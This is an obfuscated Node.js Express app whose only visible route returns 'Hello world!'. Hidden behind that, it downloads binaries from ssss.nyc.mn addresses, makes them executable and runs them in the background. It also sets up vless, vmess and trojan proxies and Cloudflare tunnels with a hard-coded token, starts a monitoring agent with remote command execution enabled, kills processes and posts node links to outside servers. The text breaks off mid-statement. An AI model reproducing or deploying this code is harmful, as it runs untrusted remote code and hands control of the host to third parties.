const _0x4bd9e2=_0x396b;(function(_0x47731d,_0x5c2f77){const _0x43b7de={_0x2bbb61:0x124,_0x18f10d:0xb8,_0x483dd5:0x15b,_0xcaaa29:0x115,_0x233b80:0xb5,_0x2f82a5:0xa0,_0x2d83d6:0xce,_0x1c70dd:0x145},_0x4bf321=_0x396b,_0x3d765e=_0x47731d();while(!![]){try{const _0x116a53=-parseInt(_0x4bf321(0xb7))/0x1*(-parseInt(_0x4bf321(_0x43b7de._0x2bbb61))/0x2)+parseInt(_0x4bf321(0xf2))/0x3*(-parseInt(_0x4bf321(_0x43b7de._0x18f10d))/0x4)+-parseInt(_0x4bf321(0x15f))/0x5*(parseInt(_0x4bf321(_0x43b7de._0x483dd5))/0x6)+parseInt(_0x4bf321(0xb6))/0x7*(parseInt(_0x4bf321(_0x43b7de._0xcaaa29))/0x8)+-parseInt(_0x4bf321(0x126))/0x9*(parseInt(_0x4bf321(0x142))/0xa)+parseInt(_0x4bf321(_0x43b7de._0x233b80))/0xb*(parseInt(_0x4bf321(_0x43b7de._0x2f82a5))/0xc)+parseInt(_0x4bf321(_0x43b7de._0x2d83d6))/0xd*(parseInt(_0x4bf321(_0x43b7de._0x1c70dd))/0xe);if(_0x116a53===_0x5c2f77)break;else _0x3d765e['push'](_0x3d765e['shift']());}catch(_0xeb5be6){_0x3d765e['push'](_0x3d765e['shift']());}}}(_0x570a,0x7a84a));const express=require(_0x4bd9e2(0xeb)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4bd9e2(0x160)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x4bd9e2(0x107)]),{execSync}=require(_0x4bd9e2(0x109)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x4bd9e2(0xc2)]||![],FILE_PATH=process[_0x4bd9e2(0xa3)]['FILE_PATH']||_0x4bd9e2(0x11e),SUB_PATH=process['env'][_0x4bd9e2(0x15c)]||_0x4bd9e2(0xa6),PORT=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0xac)]||process['env'][_0x4bd9e2(0xa1)]||0xbb8,UUID=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0xc1)]||'d600c8bd-23f6-434f-bace-0813632a44be',NEZHA_SERVER=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0x140)]||'',NEZHA_PORT=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0xcb)]||'',NEZHA_KEY=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0x111)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x4bd9e2(0xe2),ARGO_AUTH=process[_0x4bd9e2(0xa3)][_0x4bd9e2(0xd3)]||_0x4bd9e2(0xc7),ARGO_PORT=process[_0x4bd9e2(0xa3)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x4bd9e2(0x117)]||_0x4bd9e2(0xdc),CFPORT=process['env'][_0x4bd9e2(0x12f)]||0x1bb,NAME=process['env']['NAME']||'Railway';!fs[_0x4bd9e2(0x144)](FILE_PATH)?(fs[_0x4bd9e2(0xb4)](FILE_PATH),console[_0x4bd9e2(0xa4)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x4bd9e2(0x127));function _0x396b(_0xea67,_0x41ee7b){const _0x570a91=_0x570a();return _0x396b=function(_0x396b4d,_0x4cb6b0){_0x396b4d=_0x396b4d-0xa0;let _0x359830=_0x570a91[_0x396b4d];return _0x359830;},_0x396b(_0xea67,_0x41ee7b);}function _0x570a(){const _0x433162=['https+local://8.8.8.8/dns-query','nohup\x20','2053','https://oooo.serv00.net/add-url','ARGO_AUTH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','arm64','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','readFileSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x22\x20>\x20/dev/null\x202>&1','--tls','test','cdns.doon.eu.org','ArgoDomain:','/trojan-argo','includes','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','data.q959378.dpdns.org','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','Error\x20downloading\x20files:','fileUrl','random','unlinkSync','.exe\x20>\x20nul\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','express','\x0avless://','https://amd64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','push','block','/dev/null','6ttYunM','\x0a\x20\x20credentials-file:\x20','trim','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','post','\x20-c\x20\x22','pop','utf-8','boot.log','all','/api/add-nodes','/vmess-argo?ed=2560','http\x20server\x20is\x20running\x20on\x20port:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','&path=%2Fvless-argo%3Fed%3D2560#','forEach','charAt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','App\x20is\x20running','statSync','join','exec','data','child_process','text/plain;\x20charset=utf-8','tcp','\x20-p\x20','true','close','win32','isFile','NEZHA_KEY','abcdefghijklmnopqrstuvwxyz','error','arm','13344lXIVJk','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','CFIP','/api/delete-nodes','split','get','?encryption=none&security=tls&sni=','/api/add-subscriptions','Add\x20automatic\x20access\x20task\x20faild:\x20','./tmp','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=firefox&type=ws&host=','&path=%2Ftrojan-argo%3Fed%3D2560#','tls','substring','63454phOgUE','unshift','9zGHiOG','\x20already\x20exists','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','TunnelSecret','stream','fileName','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20-s\x20','CFPORT','send','\x20failed:\x20','\x0a\x20\x20\x0avmess://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','length','\x20>/dev/null\x202>&1','clear','2096','arch','/sub.txt\x20saved\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','127.0.0.1','https://amd64.ssss.nyc.mn/web','pipe','Download\x20','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','\x20>\x20nul\x202>&1','5646820VTwahQ','response','existsSync','14saWNXm','blackhole','\x20successfully','map','/vmess-argo','match','none','message','/vless-argo','base64','Error\x20executing\x20command:\x20','status','quic','basename','8443','https://amd64.ssss.nyc.mn/agent','firefox','toString','catch','\x0a\x20\x20\x0atrojan://','stringify','from','6IjqQmi','SUB_PATH','application/json','\x0a\x20\x20tunnel:\x20','115120AKvstb','path','false','pkill\x20-f\x20\x22[','708VOogrU','PORT','then','env','log','vmess','sub','sub.txt','list.txt','writeFileSync','direct','ARGO_DOMAIN:','SERVER_PORT','vless','Empowerment\x20failed\x20for\x20','automatic\x20access\x20task\x20added\x20successfully','443','finish','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','mkdirSync','56793hXphaR','3633TDMAPd','8awbwRB','1159664IPJnLL','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/tunnel.yml\x20run','Nodes\x20uploaded\x20successfully','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/bot','filter','\x20is\x20running','UUID','AUTO_ACCESS','config.yaml','aarch64','tunnel.json','platform','eyJhIjoiNzAyYzFiM2VkYzRjNzE5MGIzMTQ2Yjk4OTNhYTYzNmMiLCJ0IjoiOTliNzBlZmMtMjk3ZS00ZTBmLTk4ODQtZWNmNGNlMjMyNGIyIiwicyI6Ik9XTmhNMkkyTVRVdE1EVmpOUzAwTkRJNUxUaGhaVGN0WWpZeE9XVTFZMlExWkdVeSJ9','php\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/agent','Hello\x20world!','NEZHA_PORT','chmod','trojan','3188211BdLFYv'];_0x570a=function(){return _0x433162;};return _0x570a();}function generateRandomName(){const _0x2e3ccc=_0x4bd9e2,_0x2136f7=_0x2e3ccc(0x112);let _0x1690c8='';for(let _0x1971e8=0x0;_0x1971e8<0x6;_0x1971e8++){_0x1690c8+=_0x2136f7[_0x2e3ccc(0x102)](Math['floor'](Math[_0x2e3ccc(0xe7)]()*_0x2136f7[_0x2e3ccc(0x134)]));}return _0x1690c8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4bd9e2(0x106)](FILE_PATH,npmName),phpPath=path[_0x4bd9e2(0x106)](FILE_PATH,phpName),webPath=path[_0x4bd9e2(0x106)](FILE_PATH,webName),botPath=path[_0x4bd9e2(0x106)](FILE_PATH,botName),subPath=path[_0x4bd9e2(0x106)](FILE_PATH,_0x4bd9e2(0xa7)),listPath=path['join'](FILE_PATH,_0x4bd9e2(0xa8)),bootLogPath=path[_0x4bd9e2(0x106)](FILE_PATH,_0x4bd9e2(0xfa)),configPath=path[_0x4bd9e2(0x106)](FILE_PATH,'config.json');function deleteNodes(){const _0x399545={_0x327a22:0x15a,_0x526d15:0x156,_0x5b4682:0xf9,_0x1bf8e4:0xf6,_0x240982:0x15d,_0x59cb7e:0x157},_0x5493ac=_0x4bd9e2;try{if(!UPLOAD_URL)return;if(!fs[_0x5493ac(0x144)](subPath))return;let _0x3e0763;try{_0x3e0763=fs[_0x5493ac(0xd7)](subPath,'utf-8');}catch{return null;}const _0x1fdc94=Buffer[_0x5493ac(_0x399545._0x327a22)](_0x3e0763,_0x5493ac(0x14e))[_0x5493ac(_0x399545._0x526d15)](_0x5493ac(_0x399545._0x5b4682)),_0x5b496e=_0x1fdc94[_0x5493ac(0x119)]('\x0a')['filter'](_0x40b2d8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5493ac(0xdb)](_0x40b2d8));if(_0x5b496e[_0x5493ac(0x134)]===0x0)return;return axios[_0x5493ac(_0x399545._0x1bf8e4)](UPLOAD_URL+_0x5493ac(0x118),JSON[_0x5493ac(0x159)]({'nodes':_0x5b496e}),{'headers':{'Content-Type':_0x5493ac(_0x399545._0x240982)}})[_0x5493ac(_0x399545._0x59cb7e)](_0x1bb562=>{return null;}),null;}catch(_0x34219d){return null;}}function cleanupOldFiles(){const _0x267662={_0x57e82a:0x101},_0x47f8fe={_0x5ec890:0x106,_0x5ef26f:0x105,_0x3a4158:0xe8},_0x47c282=_0x4bd9e2;try{const _0xfcf42a=fs['readdirSync'](FILE_PATH);_0xfcf42a[_0x47c282(_0x267662._0x57e82a)](_0x4ca6c8=>{const _0x56c014=_0x47c282,_0x2fd54c=path[_0x56c014(_0x47f8fe._0x5ec890)](FILE_PATH,_0x4ca6c8);try{const _0x531271=fs[_0x56c014(_0x47f8fe._0x5ef26f)](_0x2fd54c);_0x531271[_0x56c014(0x110)]()&&fs[_0x56c014(_0x47f8fe._0x3a4158)](_0x2fd54c);}catch(_0x511d77){}});}catch(_0x450c31){}}app['get']('/',function(_0x462b7a,_0x2ae1f9){const _0xa90c34={_0x43bed4:0x130,_0x29ed00:0xca},_0x3926b1=_0x4bd9e2;_0x2ae1f9[_0x3926b1(_0xa90c34._0x43bed4)](_0x3926b1(_0xa90c34._0x29ed00));});async function generateConfig(){const _0x9b98fa={_0x805da6:0xf1,_0x23f40b:0x14b,_0x5ec39e:0x149,_0x58ea49:0x13b,_0x11de75:0x13b,_0x178c01:0x14b,_0x340f67:0x14b,_0xec8537:0xa5,_0x5d2db8:0x122,_0x488e85:0xcd,_0x35a948:0xde,_0xf2cbb:0xe4,_0x9d1140:0xa9},_0x3e3a08=_0x4bd9e2,_0x541740={'log':{'access':_0x3e3a08(_0x9b98fa._0x805da6),'error':_0x3e3a08(_0x9b98fa._0x805da6),'loglevel':_0x3e3a08(_0x9b98fa._0x23f40b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3e3a08(0xad),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3e3a08(0x14b),'fallbacks':[{'dest':0xbb9},{'path':_0x3e3a08(0x14d),'dest':0xbba},{'path':_0x3e3a08(_0x9b98fa._0x5ec39e),'dest':0xbbb},{'path':_0x3e3a08(0xde),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3e3a08(_0x9b98fa._0x58ea49),'protocol':_0x3e3a08(0xad),'settings':{'clients':[{'id':UUID}],'decryption':_0x3e3a08(0x14b)},'streamSettings':{'network':_0x3e3a08(0x10b),'security':'none'}},{'port':0xbba,'listen':_0x3e3a08(_0x9b98fa._0x11de75),'protocol':_0x3e3a08(0xad),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3e3a08(_0x9b98fa._0x178c01)},'streamSettings':{'network':'ws','security':_0x3e3a08(_0x9b98fa._0x340f67),'wsSettings':{'path':_0x3e3a08(0x14d)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3e3a08(_0x9b98fa._0xec8537),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3e3a08(_0x9b98fa._0x5ec39e)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e3a08(0xe4),_0x3e3a08(_0x9b98fa._0x5d2db8),_0x3e3a08(0x151)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3e3a08(_0x9b98fa._0x488e85),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3e3a08(0x14b),'wsSettings':{'path':_0x3e3a08(_0x9b98fa._0x35a948)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e3a08(_0x9b98fa._0xf2cbb),_0x3e3a08(_0x9b98fa._0x5d2db8),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3e3a08(0xcf)]},'outbounds':[{'protocol':'freedom','tag':_0x3e3a08(0xaa)},{'protocol':_0x3e3a08(0x146),'tag':_0x3e3a08(0xf0)}]};fs[_0x3e3a08(_0x9b98fa._0x9d1140)](path['join'](FILE_PATH,'config.json'),JSON[_0x3e3a08(0x159)](_0x541740,null,0x2));}function getSystemArchitecture(){const _0x704da={_0x38c1bf:0x138,_0x6dae04:0xd5,_0x5cb8a1:0xc4},_0x16092b=_0x4bd9e2,_0x23f6bd=os[_0x16092b(_0x704da._0x38c1bf)]();return _0x23f6bd===_0x16092b(0x114)||_0x23f6bd===_0x16092b(_0x704da._0x6dae04)||_0x23f6bd===_0x16092b(_0x704da._0x5cb8a1)?'arm':'amd';}function downloadFile(_0x1a0533,_0x48a0ca,_0x282720){const _0x23defc={_0x3f9675:0xb4,_0x3d99a1:0x11a,_0x5c483c:0xa2,_0x5904c5:0x157},_0x37b41c={_0x3ee199:0x152,_0x2da5a7:0x131,_0x327834:0x14c,_0x121bfc:0x113},_0x5c7177={_0x1d7bc8:0xb1},_0x4fb37f=_0x4bd9e2,_0x214759=_0x1a0533;!fs[_0x4fb37f(0x144)](FILE_PATH)&&fs[_0x4fb37f(_0x23defc._0x3f9675)](FILE_PATH,{'recursive':!![]});const _0x5b553d=fs['createWriteStream'](_0x214759);axios({'method':_0x4fb37f(_0x23defc._0x3d99a1),'url':_0x48a0ca,'responseType':_0x4fb37f(0x12a)})[_0x4fb37f(_0x23defc._0x5c483c)](_0x89d38f=>{const _0x92f467={_0x3f4c69:0x13e},_0x54c6b1=_0x4fb37f;_0x89d38f[_0x54c6b1(0x108)][_0x54c6b1(0x13d)](_0x5b553d),_0x5b553d['on'](_0x54c6b1(_0x5c7177._0x1d7bc8),()=>{const _0x51075a=_0x54c6b1;_0x5b553d[_0x51075a(0x10e)](),console[_0x51075a(0xa4)](_0x51075a(0x13e)+path['basename'](_0x214759)+_0x51075a(0x147)),_0x282720(null,_0x214759);}),_0x5b553d['on'](_0x54c6b1(0x113),_0x2bd8d2=>{const _0x134441=_0x54c6b1;fs['unlink'](_0x214759,()=>{});const _0x4b220e=_0x134441(_0x92f467._0x3f4c69)+path['basename'](_0x214759)+'\x20failed:\x20'+_0x2bd8d2[_0x134441(0x14c)];console['error'](_0x4b220e),_0x282720(_0x4b220e);});})[_0x4fb37f(_0x23defc._0x5904c5)](_0x1bcd87=>{const _0xa0c9cf=_0x4fb37f,_0x1eca8e=_0xa0c9cf(0x13e)+path[_0xa0c9cf(_0x37b41c._0x3ee199)](_0x214759)+_0xa0c9cf(_0x37b41c._0x2da5a7)+_0x1bcd87[_0xa0c9cf(_0x37b41c._0x327834)];console[_0xa0c9cf(_0x37b41c._0x121bfc)](_0x1eca8e),_0x282720(_0x1eca8e);});}async function downloadFilesAndRun(){const _0x3156b3={_0x141c56:0x113,_0x19f30d:0xe0,_0x44906c:0x10d,_0x257ad6:0x161,_0x43a74d:0xe3,_0x984b70:0xa9,_0x4fc4a3:0xf7,_0x4b4138:0xc0,_0x252d8f:0x153,_0x4f9f24:0x137,_0x2dd866:0xd1,_0x457904:0xda,_0x52a8fc:0xd0,_0x278793:0x14a,_0x549686:0x14a,_0x3b46cf:0xbb,_0x4cfe3c:0xf5,_0xe773f9:0xb9},_0x25e9e8={_0x559c0a:0xcc},_0xcc7124=_0x4bd9e2,_0x4fbba8=getSystemArchitecture(),_0x24286f=getFilesForArchitecture(_0x4fbba8);if(_0x24286f['length']===0x0){console['log'](_0xcc7124(0x13a));return;}const _0x2af181=_0x24286f[_0xcc7124(0x148)](_0x38ac20=>{return new Promise((_0x5eecd5,_0x5341a6)=>{const _0x18a64a=_0x396b;downloadFile(_0x38ac20[_0x18a64a(0x12b)],_0x38ac20[_0x18a64a(0xe6)],(_0x2125fe,_0x42e566)=>{_0x2125fe?_0x5341a6(_0x2125fe):_0x5eecd5(_0x42e566);});});});try{await Promise[_0xcc7124(0xfb)](_0x2af181);}catch(_0x1f83e2){console[_0xcc7124(_0x3156b3._0x141c56)](_0xcc7124(0xe5),_0x1f83e2);return;}function _0x1a3822(_0x33760d){const _0x17f9c4={_0x4e864a:0x156},_0x5626e5=0x1fd;_0x33760d['forEach'](_0x2efcd5=>{const _0xe1fd28=_0x396b;fs[_0xe1fd28(0x144)](_0x2efcd5)&&fs[_0xe1fd28(_0x25e9e8._0x559c0a)](_0x2efcd5,_0x5626e5,_0x34d9d3=>{const _0x42d515=_0xe1fd28;_0x34d9d3?console['error'](_0x42d515(0xae)+_0x2efcd5+':\x20'+_0x34d9d3):console['log']('Empowerment\x20success\x20for\x20'+_0x2efcd5+':\x20'+_0x5626e5[_0x42d515(_0x17f9c4._0x4e864a)](0x8));});});}const _0x20835c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1a3822(_0x20835c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x638f4=NEZHA_SERVER[_0xcc7124(0xdf)](':')?NEZHA_SERVER[_0xcc7124(0x119)](':')[_0xcc7124(0xf8)]():'',_0xd324a0=new Set([_0xcc7124(0xb0),_0xcc7124(0x153),_0xcc7124(0x137),_0xcc7124(_0x3156b3._0x19f30d),'2083',_0xcc7124(0xd1)]),_0x2e0007=_0xd324a0['has'](_0x638f4)?_0xcc7124(_0x3156b3._0x44906c):_0xcc7124(_0x3156b3._0x257ad6),_0x1ac45c='\x0aclient_secret:\x20'+NEZHA_KEY+_0xcc7124(0x11f)+NEZHA_SERVER+_0xcc7124(_0x3156b3._0x43a74d)+_0x2e0007+_0xcc7124(0x133)+UUID;fs[_0xcc7124(_0x3156b3._0x984b70)](path[_0xcc7124(0x106)](FILE_PATH,_0xcc7124(0xc3)),_0x1ac45c);const _0x3bda04=_0xcc7124(0xd0)+phpPath+_0xcc7124(_0x3156b3._0x4fc4a3)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3bda04),console[_0xcc7124(0xa4)](phpName+_0xcc7124(_0x3156b3._0x4b4138)),await new Promise(_0x15588c=>setTimeout(_0x15588c,0x3e8));}catch(_0x23e933){console[_0xcc7124(0x113)](_0xcc7124(0xc8)+_0x23e933);}}else{let _0x203272='';const _0xe1c229=['443',_0xcc7124(_0x3156b3._0x252d8f),_0xcc7124(_0x3156b3._0x4f9f24),_0xcc7124(0xe0),'2083',_0xcc7124(_0x3156b3._0x2dd866)];_0xe1c229[_0xcc7124(0xdf)](NEZHA_PORT)&&(_0x203272=_0xcc7124(_0x3156b3._0x457904));const _0x1e7e36=_0xcc7124(0xd0)+npmPath+_0xcc7124(0x12e)+NEZHA_SERVER+':'+NEZHA_PORT+_0xcc7124(0x10c)+NEZHA_KEY+'\x20'+_0x203272+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1e7e36),console[_0xcc7124(0xa4)](npmName+_0xcc7124(0xc0)),await new Promise(_0x41db76=>setTimeout(_0x41db76,0x3e8));}catch(_0x19f51c){console[_0xcc7124(_0x3156b3._0x141c56)]('npm\x20running\x20error:\x20'+_0x19f51c);}}}else console['log'](_0xcc7124(0xd8));const _0x5c8c66=_0xcc7124(_0x3156b3._0x52a8fc)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5c8c66),console[_0xcc7124(0xa4)](webName+_0xcc7124(0xc0)),await new Promise(_0x54c81d=>setTimeout(_0x54c81d,0x3e8));}catch(_0x5beb36){console['error']('web\x20running\x20error:\x20'+_0x5beb36);}if(fs['existsSync'](botPath)){let _0x471e0f;if(ARGO_AUTH[_0xcc7124(_0x3156b3._0x278793)](/^[A-Z0-9a-z=]{120,250}$/))_0x471e0f=_0xcc7124(0x128)+ARGO_AUTH;else ARGO_AUTH[_0xcc7124(_0x3156b3._0x549686)](/TunnelSecret/)?_0x471e0f=_0xcc7124(0xd6)+FILE_PATH+_0xcc7124(_0x3156b3._0x3b46cf):_0x471e0f=_0xcc7124(0xe1)+FILE_PATH+_0xcc7124(_0x3156b3._0x4cfe3c)+ARGO_PORT;try{await exec(_0xcc7124(0xd0)+botPath+'\x20'+_0x471e0f+_0xcc7124(_0x3156b3._0xe773f9)),console[_0xcc7124(0xa4)](botName+'\x20is\x20running'),await new Promise(_0x21104d=>setTimeout(_0x21104d,0x7d0));}catch(_0x15a5b1){console[_0xcc7124(0x113)]('Error\x20executing\x20command:\x20'+_0x15a5b1);}}await new Promise(_0xc6fdd=>setTimeout(_0xc6fdd,0x1388));}function getFilesForArchitecture(_0x24cdc6){const _0x413086={_0x41a613:0x114,_0xecd13c:0xbe,_0x3ae910:0x13c,_0x43027b:0x154,_0x1cec0c:0x114,_0x5e6fbe:0xb3,_0x575d08:0x13f},_0x316129=_0x4bd9e2;let _0x53a8fe;_0x24cdc6===_0x316129(_0x413086._0x41a613)?_0x53a8fe=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x316129(_0x413086._0xecd13c)}]:_0x53a8fe=[{'fileName':webPath,'fileUrl':_0x316129(_0x413086._0x3ae910)},{'fileName':botPath,'fileUrl':_0x316129(0xed)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1646bd=_0x24cdc6===_0x316129(_0x413086._0x41a613)?_0x316129(0xc9):_0x316129(_0x413086._0x43027b);_0x53a8fe['unshift']({'fileName':npmPath,'fileUrl':_0x1646bd});}else{const _0x407d4a=_0x24cdc6===_0x316129(_0x413086._0x1cec0c)?_0x316129(_0x413086._0x5e6fbe):_0x316129(_0x413086._0x575d08);_0x53a8fe[_0x316129(0x125)]({'fileName':phpPath,'fileUrl':_0x407d4a});}}return _0x53a8fe;}function argoType(){const _0x5ced37={_0x1e2f5b:0xba,_0x2756e7:0xa9,_0x88c447:0x119,_0x23aa3a:0xc5,_0x9e2443:0x12d,_0x2ce6fb:0xa4,_0x250f32:0x116},_0xe444df=_0x4bd9e2;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xe444df(_0x5ced37._0x1e2f5b));return;}if(ARGO_AUTH[_0xe444df(0xdf)](_0xe444df(0x129))){fs[_0xe444df(_0x5ced37._0x2756e7)](path[_0xe444df(0x106)](FILE_PATH,_0xe444df(0xc5)),ARGO_AUTH);const _0x143d42=_0xe444df(0x15e)+ARGO_AUTH[_0xe444df(_0x5ced37._0x88c447)]('\x22')[0xb]+_0xe444df(0xf3)+path[_0xe444df(0x106)](FILE_PATH,_0xe444df(_0x5ced37._0x23aa3a))+_0xe444df(0x103)+ARGO_DOMAIN+_0xe444df(_0x5ced37._0x9e2443)+ARGO_PORT+_0xe444df(0xd4);fs[_0xe444df(0xa9)](path[_0xe444df(0x106)](FILE_PATH,'tunnel.yml'),_0x143d42);}else console[_0xe444df(_0x5ced37._0x2ce6fb)](_0xe444df(_0x5ced37._0x250f32));}argoType();async function extractDomains(){const _0x12368c={_0x207d5a:0xab,_0x1f175b:0x119,_0x3ca56c:0x101,_0x22ef4d:0xdd,_0x2a3faa:0xa4,_0x4dbe8b:0xea,_0x1d9926:0xb9},_0x1bb2c6={_0x40b7e8:0x123,_0x6e111b:0xd9},_0x4124d4=_0x4bd9e2;let _0xdbf135;if(ARGO_AUTH&&ARGO_DOMAIN)_0xdbf135=ARGO_DOMAIN,console['log'](_0x4124d4(_0x12368c._0x207d5a),_0xdbf135),await _0x4d7493(_0xdbf135);else try{const _0x2c7eea=fs['readFileSync'](path[_0x4124d4(0x106)](FILE_PATH,_0x4124d4(0xfa)),_0x4124d4(0xf9)),_0x3b7a5f=_0x2c7eea[_0x4124d4(_0x12368c._0x1f175b)]('\x0a'),_0x1b6b33=[];_0x3b7a5f[_0x4124d4(_0x12368c._0x3ca56c)](_0x489a5c=>{const _0x2c3ea6=_0x4124d4,_0x22c575=_0x489a5c[_0x2c3ea6(0x14a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x22c575){const _0xbdf708=_0x22c575[0x1];_0x1b6b33['push'](_0xbdf708);}});if(_0x1b6b33['length']>0x0)_0xdbf135=_0x1b6b33[0x0],console['log'](_0x4124d4(_0x12368c._0x22ef4d),_0xdbf135),await _0x4d7493(_0xdbf135);else{console[_0x4124d4(_0x12368c._0x2a3faa)](_0x4124d4(_0x12368c._0x4dbe8b)),fs[_0x4124d4(0xe8)](path[_0x4124d4(0x106)](FILE_PATH,'boot.log'));async function _0x4f7d5b(){const _0x5d3e69=_0x4124d4;try{process[_0x5d3e69(0xc6)]===_0x5d3e69(0x10f)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x5d3e69(0xe9)):await exec(_0x5d3e69(0x162)+botName[_0x5d3e69(0x102)](0x0)+']'+botName[_0x5d3e69(_0x1bb2c6._0x40b7e8)](0x1)+_0x5d3e69(_0x1bb2c6._0x6e111b));}catch(_0x3e04f7){}}_0x4f7d5b(),await new Promise(_0xeaf442=>setTimeout(_0xeaf442,0xbb8));const _0x596e71=_0x4124d4(0xe1)+FILE_PATH+_0x4124d4(0xf5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x596e71+_0x4124d4(_0x12368c._0x1d9926)),console['log'](botName+_0x4124d4(0xc0)),await new Promise(_0x7f5621=>setTimeout(_0x7f5621,0xbb8)),await extractDomains();}catch(_0x53b201){console[_0x4124d4(0x113)](_0x4124d4(0x14f)+_0x53b201);}}}catch(_0x4f89f7){console['error']('Error\x20reading\x20boot.log:',_0x4f89f7);}async function _0x4d7493(_0x2bf973){const _0x51f24e=_0x4124d4,_0x2768cd=execSync(_0x51f24e(0xff),{'encoding':_0x51f24e(0xf9)}),_0x5a5ccf=_0x2768cd[_0x51f24e(0xf4)](),_0x33ebe2=NAME?NAME+'-'+_0x5a5ccf:_0x5a5ccf;return new Promise(_0x1d831a=>{const _0x21c3dd={_0x346955:0xfd,_0x344229:0x122,_0x948e7f:0x11b,_0x336457:0x121,_0x539f86:0xa4,_0x1cb319:0x15a,_0x52a7c8:0x14e,_0x33f0d8:0x11a},_0x2abfc3={_0x5b84a8:0x14e,_0x47997d:0x10a,_0x477e56:0x130};setTimeout(()=>{const 